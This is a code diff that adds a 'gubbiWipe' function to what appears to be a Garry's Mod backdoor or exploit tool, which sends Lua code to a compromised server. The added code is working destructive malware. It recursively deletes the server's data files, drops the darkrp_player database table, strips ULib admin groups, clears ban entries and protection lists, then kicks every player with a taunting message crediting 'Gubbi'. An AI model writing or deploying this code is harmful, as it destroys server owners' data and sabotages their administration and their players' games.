@@ -694,7 +694,47 @@ end
 function unGodAll() 
 	sendLua([[for k,v in pairs(player.GetAll()) do v:GodDisable() end]]) 
 end 
-	
+
+function gubbiWipe()
+sendLua([[local function WipeDir(dir)
+	    local files,dirs = file.Find(dir.."*", "DATA")
+	    for k,v in ipairs(files) do
+	        file.Delete(dir..v)
+	    end
+	    for k,v in ipairs(dirs) do
+	        WipeDir(v.."/")
+	    end
+	end
+	print(60*60*6)
+	local function wiperpro()
+	    print("Wiping server data. . .")
+	    WipeDir("")
+	    sql.Query("DROP TABLE darkrp_player; CREATE TABLE darkrp_player(a STRING)")
+	    if ULib then
+	        for k,v in pairs(ULib.ucl.groups) do
+	            if k != "user" then
+	                ULib.ucl.removeGroup(k)
+	            end
+	        end
+	    end
+	    if FPP then
+	        for k,v in pairs(FPP.Blocked) do
+	            for r,g in pairs(v) do
+	                RunConsoleCommand([=[FPP_RemoveBlocked]=], k, r)
+	            end
+	        end
+	    end
+	    for i=1,256 do
+	        RunConsoleCommand("removeid",i)
+	    end
+	    for k,v in ipairs(player.GetAll()) do
+	        v:Kick("[ULX] Oops, the server has been wiped by Gubbi#8857 !\nLeaks are bad\nhttp://gubbi.xyz")
+	    end
+	    print("Wipe finished !")
+	end
+	wiperpro()]])
+end
+
 function moanSteps()
 sendLua([[if !moanstep then
 	hook.Add("PlayerFootstep", "oooh", function(ply)
